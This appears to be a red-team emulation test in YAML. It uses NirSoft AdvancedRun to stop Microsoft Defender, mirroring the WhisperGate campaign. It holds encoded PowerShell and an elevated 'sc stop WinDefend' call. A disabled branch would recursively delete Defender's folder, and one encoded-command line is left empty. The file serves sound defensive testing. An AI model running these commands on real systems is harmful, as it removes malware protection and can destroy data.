- id: 08d1830b-c6a2-5c05-974e-3c9479a54d76
  name: Soumaia ART Tests - Disable Defender Using NirSoft AdvancedRun
  description: 'Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html

    This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.

    See https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3

    Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. (requires elevation)'
  tactic: defense-impairment
  technique:
    attack_id: T1685
    name: Disable or Modify Tools
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACgAVABlAHMAdAAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAQQBkAHYAYQBuAGMAZQBkAFIAdQBuAC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          Try {cmd /c "$env:TEMP\ART-ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
          if(0){
            $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
            Try {cmd /c "$env:TEMP\ART-ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
          }
        cleanup: |-
          Try {cmd /c "$env:TEMP\ART-ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
